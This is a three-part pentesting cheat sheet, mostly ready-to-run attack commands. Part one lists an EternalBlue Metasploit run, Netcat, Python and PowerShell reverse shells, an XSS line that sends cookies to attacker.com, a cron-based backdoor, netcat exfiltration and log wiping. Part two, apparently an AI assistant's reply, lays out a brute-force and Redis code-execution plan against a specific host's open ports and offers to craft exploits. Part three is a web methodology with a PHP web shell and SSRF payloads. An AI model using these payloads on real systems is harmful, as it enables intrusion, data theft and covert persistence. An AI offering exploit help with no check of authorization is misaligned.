# **Pentesting Cheat Sheet**

---

## **1. Reconnaissance & Scanning**

### 🔍 **Nmap - Network Scanning**

![Nmap Logo](https://upload.wikimedia.org/wikipedia/commons/9/94/Nmap_logo.png)

```bash
# Basic scan
nmap -sV -sC <target>

# Stealth scan
nmap -sS -T4 <target>

# Aggressive scan
nmap -A <target>

# Scan specific ports
nmap -p 22,80,443 <target>

# Detect OS
nmap -O <target>
```

### 🌐 **Subdomain Enumeration**

![Sublist3r Logo](https://upload.wikimedia.org/wikipedia/commons/5/5f/Globe.png)

```bash
# Using Sublist3r
sublist3r -d example.com

# Using Assetfinder
assetfinder --subs-only example.com

# Using Amass
amass enum -d example.com
```

### 📂 **Directory Enumeration**

![Gobuster Logo](https://upload.wikimedia.org/wikipedia/commons/8/89/Folder-blue.svg)

```bash
# Using dirb
dirb http://example.com

# Using gobuster
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Using ffuf
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/rockyou.txt
```

---

## **2. Exploitation**

### 🎯 **Metasploit - Exploit Framework**

![Metasploit Logo](https://upload.wikimedia.org/wikipedia/commons/4/4f/Metasploit_logo.svg)

```bash
# Start Metasploit
msfconsole

# Search for exploits
search exploit windows/smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set target
set RHOSTS <target-ip>

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Exploit the target
exploit
```

### 🐍 **SQL Injection**

![SQL Injection Icon](https://upload.wikimedia.org/wikipedia/commons/3/3f/Database-icon.svg)

```sql
# Check for SQLi vulnerability
' OR '1'='1' --

# Dump database tables using sqlmap
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Dump table contents
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables --dump
```

---

## **3. Post-Exploitation**

### 🔄 **Reverse Shells**

![Reverse Shell Icon](https://upload.wikimedia.org/wikipedia/commons/7/73/Linux_kernel_and_GNU_%28colored%29.svg)

**Netcat Reverse Shell**

```bash
# Attacker (listener)
nc -lvnp 4444

# Target (connect back)
nc <attacker-ip> 4444 -e /bin/bash
```

**Python Reverse Shell**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PowerShell Reverse Shell (Windows)**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("<attacker-ip>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

---

## **4. Web Application Attacks**

### 🚨 **Cross-Site Scripting (XSS)**

![XSS Icon](https://upload.wikimedia.org/wikipedia/commons/d/db/Script.svg)

```html
# Basic XSS Payload
<script>alert('XSS')</script>

# Stealing cookies
<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>
```

---

## **5. Persistence & Backdoors**

### 🔑 **Adding SSH Key for Persistence**

```bash
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
```

### ⏳ **Creating a Cron Job for Persistence**

```bash
(crontab -l ; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'") | crontab -
```

---

## **6. Data Exfiltration**

### 📤 **Using Netcat**

```bash
# Send a file
nc -w 3 <attacker-ip> 4444 < secret.txt

# Receive a file
nc -lvp 4444 > secret.txt
```

### 📡 **Using SCP**

```bash
# Transfer file from target to attacker
scp user@target:/path/to/file /local/destination
```

---

## **7. Clearing Tracks**

### 🧹 **Delete Bash History**

```bash
history -c && history -w
```

### 🗑️ **Remove Logs**

```bash
echo "" > /var/log/auth.log
echo "" > ~/.bash_history
```

### 🔇 **Disable Logging Temporarily**

```bash
echo 0 > /proc/sys/kernel/kptr_restrict
```

---





# PART 2


Based on the open ports you've identified, here's a structured approach to penetration testing the target, focusing on potential vulnerabilities and exploitation paths for each service:

---

### **1. SSH (Port 22)**
- **Brute-force Attack**: If weak credentials are suspected, use `hydra`:
  ```bash
  hydra -l <username> -P /path/to/wordlist.txt ssh://<target_ip>
  ```
- **Key-based Exploits**: Check for default or leaked SSH keys.
- **Version Exploits**: Identify the SSH version for known vulnerabilities:
  ```bash
  nc -nv <target_ip> 22
  ```

---

### **2. HTTP/HTTPS (Ports 80, 443)**
- **Web Application Testing**:
  - Run `nikto` for quick vulnerability scanning:
    ```bash
    nikto -h http://<target_ip>
    ```
  - Use `gobuster` for directory brute-forcing:
    ```bash
    gobuster dir -u http://<target_ip> -w /path/to/wordlist.txt
    ```
  - Test for SSRF, SQLi, XSS, and file inclusion vulnerabilities.
- **SSL/TLS Testing**:
  - Check for weak ciphers or outdated protocols:
    ```bash
    openssl s_client -connect <target_ip>:443 -tls1_2
    ```
  - Use `testssl.sh` for comprehensive testing:
    ```bash
    ./testssl.sh <target_ip>
    ```

---

### **3. HTTP Services (Ports 3000, 3001, 3003, 3008, 4000, 4004)**
These ports likely host additional web applications or APIs. For each:
- **Manual Inspection**: Access via browser (`http://<target_ip>:3000`).
- **Automated Scanning**:
  ```bash
  nmap -sV -p 3000,3001,3003,3008,4000,4004 --script vuln <target_ip>
  ```
- **API Testing**: If these are APIs, test for:
  - Authentication bypass.
  - Insecure direct object references (IDOR).
  - Injection flaws.

---

### **4. PostgreSQL (Ports 5432, 5433)**
- **Default Credentials**: Try `postgres:postgres` or other common combinations.
- **Command Execution**:
  - Use `metasploit` for PostgreSQL exploits:
    ```bash
    msfconsole
    use auxiliary/scanner/postgres/postgres_login
    set RHOSTS <target_ip>
    run
    ```
  - If credentials are found, escalate to RCE:
    ```bash
    use exploit/linux/postgres/postgres_payload
    ```

---

### **5. Redis (Port 6379)**
Redis is often misconfigured. Test for:
- **Unauthorized Access**:
  ```bash
  redis-cli -h <target_ip>
  ```
- **RCE via Cron Jobs**:
  ```bash
  echo -e "\n\n*/1 * * * * /bin/bash -c 'sh -i >& /dev/tcp/<attacker_ip>/4444 0>&1'\n\n" | redis-cli -h <target_ip> -x set 1
  redis-cli -h <target_ip> config set dir /var/spool/cron/
  redis-cli -h <target_ip> config set dbfilename root
  redis-cli -h <target_ip> save
  ```
- **Data Exfiltration**: Dump all keys:
  ```bash
  redis-cli -h <target_ip> keys "*"
  ```

---

### **6. Unknown Service (Port 8090)**
- **Service Identification**:
  ```bash
  nmap -sV -p 8090 <target_ip>
  ```
- **Manual Inspection**: Access via browser or `curl`:
  ```bash
  curl http://<target_ip>:8090
  ```
- **Fuzzing**: Use `ffuf` to discover endpoints:
  ```bash
  ffuf -u http://<target_ip>:8090/FUZZ -w /path/to/wordlist.txt
  ```

---

### **Exploitation Workflow**
1. **Start with Low-Hanging Fruit**:
   - Check Redis and PostgreSQL for unauthorized access.
   - Test default credentials on SSH and web interfaces.
2. **Escalate to Web Exploits**:
   - Use SSRF or file inclusion to gain a foothold.
   - Chain vulnerabilities (e.g., SSRF → Redis RCE).
3. **Post-Exploitation**:
   - Pivot to internal networks.
   - Exfiltrate data or escalate privileges.

---

### **Tools to Use**
- **Network Scanning**: `nmap`, `masscan`.
- **Web Testing**: `burp suite`, `nikto`, `gobuster`.
- **Exploitation**: `metasploit`, `hydra`, `redis-cli`.
- **Post-Exploitation**: `linpeas`, `pspy`.

---

### **Mitigation Recommendations**
After testing, suggest:
1. **Patch Services**: Update PostgreSQL, Redis, and web servers.
2. **Restrict Access**: Use firewalls to limit port exposure.
3. **Harden Configurations**:
   - Disable Redis default bindings.
   - Enforce strong passwords for SSH and databases.
4. **Monitor Logs**: Detect brute-force attempts or unusual access.

---

Let me know if you'd like help crafting specific exploits or automating any steps!





# Web Pentest Part 3 methodology 
Here’s a comprehensive **Web Penetration Testing Methodology** in Obsidian-flavored Markdown format, with emojis for clarity. This guide covers everything from reconnaissance to reporting, tailored for authorized testing.

---

```markdown
# 🌐 Web Penetration Testing Methodology (A-Z)  
*Authorized and ethical testing only.*  

---

## 📌 **1. Pre-Engagement**  
### 📋 Scope Definition  
- Define **in-scope** domains, subdomains, IPs, and APIs.  
- Exclude **out-of-scope** assets (e.g., production databases).  
- Agree on **rules of engagement** (e.g., no DDoS, timing restrictions).  

### 📜 Legal Documentation  
- Signed **authorization letter** from the client.  
- **NDA** (if required).  

---

## 🔍 **2. Reconnaissance (Passive + Active)**  
### 🌐 Passive Recon  
- **Subdomain Enumeration**:  
  ```bash
  subfinder -d target.com | tee subdomains.txt  
  amass enum -passive -d target.com -o subdomains.txt  
  ```
- **DNS Lookups**: `dig`, `nslookup`, `dnsrecon`.  
- **Certificate Transparency**: [crt.sh](https://crt.sh/).  
- **Wayback Machine**: [web.archive.org](https://web.archive.org/).  

### 🎯 Active Recon  
- **Port Scanning**:  
  ```bash
  nmap -sV -sC -p- -T4 -oA full_scan target.com  
  ```
- **Web Server Fingerprinting**:  
  ```bash
  wafw00f target.com  
  whatweb target.com  
  ```

---

## 🛠️ **3. Vulnerability Scanning**  
### 🔄 Automated Scans  
- **Nikto**:  
  ```bash
  nikto -h https://target.com -output nikto_scan.txt  
  ```
- **Burp Suite**: Run **passive scans** while browsing.  
- **Nuclei** (Templates for CVEs):  
  ```bash
  nuclei -u https://target.com -t cves/ -o nuclei_scan.txt  
  ```

### 🎯 Manual Checks  
- **Headers**: `X-Forwarded-For`, `CORS`, `HSTS`.  
- **Robots.txt**: Check for exposed paths.  

---

## 🎯 **4. Enumeration**  
### 📂 Directory/File Bruteforcing  
```bash
gobuster dir -u https://target.com -w /path/to/wordlist.txt -x php,html,json  
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt  
```

### 🔍 API Testing  
- **Endpoints**: `/api/v1/users`, `/graphql`.  
- **Tools**: `Postman`, `Burp Suite`, `OWASP ZAP`.  

---

## 🚨 **5. Exploitation**  
### 🎯 Common Web Vulnerabilities  
#### 🔓 **1. Injection Attacks**  
- **SQLi**:  
  ```bash
  sqlmap -u "https://target.com/login?id=1" --batch --risk=3  
  ```
- **XSS**:  
  ```html
  <script>alert(1)</script>  
  ```
- **Command Injection**:  
  ```bash
  ; cat /etc/passwd  
  ```

#### 🔄 **2. SSRF (Server-Side Request Forgery)**  
```http
GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1  
```

#### 🛑 **3. Broken Access Control**  
- **IDOR**:  
  ```http
  GET /user/profile?id=1337 HTTP/1.1  
  ```

#### 📂 **4. File Upload Bypass**  
- Upload `.php` with magic bytes:  
  ```bash
  echo "GIF8; <?php system($_GET['cmd']); ?>" > shell.gif.php  
  ```

#### 🔐 **5. Authentication Bypass**  
- **JWT Tampering**: Use `jwt_tool`.  
- **Default Creds**: `admin:admin`, `guest:guest`.  

---

## 🕵️ **6. Post-Exploitation**  
### 📂 Data Exfiltration  
- **Sensitive Files**:  
  ```bash
  curl https://target.com/../../etc/passwd  
  ```
- **Database Dumps**:  
  ```bash
  mysqldump -u admin -p password target_db > dump.sql  
  ```

### 🔄 Pivoting  
- **Internal Network Scanning**:  
  ```bash
  nmap -sn 192.168.1.0/24  
  ```

---

## 📝 **7. Reporting**  
### 📋 Executive Summary  
- **Risk Rating**: Critical/High/Medium/Low.  
- **Impact**: Data breach, RCE, etc.  

### 🔍 Technical Details  
- **Vulnerability**: Description + CVSS score.  
- **Proof of Concept (PoC)**: Screenshots, cURL commands.  
- **Remediation**: Patch, input validation, WAF rules.  

### 🎯 Tools Used  
- `Burp Suite`, `Nmap`, `Metasploit`, `SQLMap`.  

---

## 🔄 **8. Retesting**  
- Verify fixes after patches are applied.  
- Re-run scans to confirm no regressions.  

---

## 🏆 **Pro Tips**  
1. **Automate Repetitive Tasks**: Use `Bash`/`Python` scripts.  
2. **Stay Updated**: Follow [PortSwigger](https://portswigger.net/) and [OWASP](https://owasp.org/).  
3. **Document Everything**: Obsidian, Notion, or DokuWiki.  

```

---

### 🔗 **Obsidian Integration**  
- Use **tags** like `#pentest`, `#web`, `#vulnerability`.  
- Link related notes (e.g., `[[SQLi Cheatsheet]]`).  

---

### 🎯 **Final Notes**  
- **Ethics**: Always get **written permission**.  
- **Avoid Damage**: No `rm -rf /` or DDoS.  

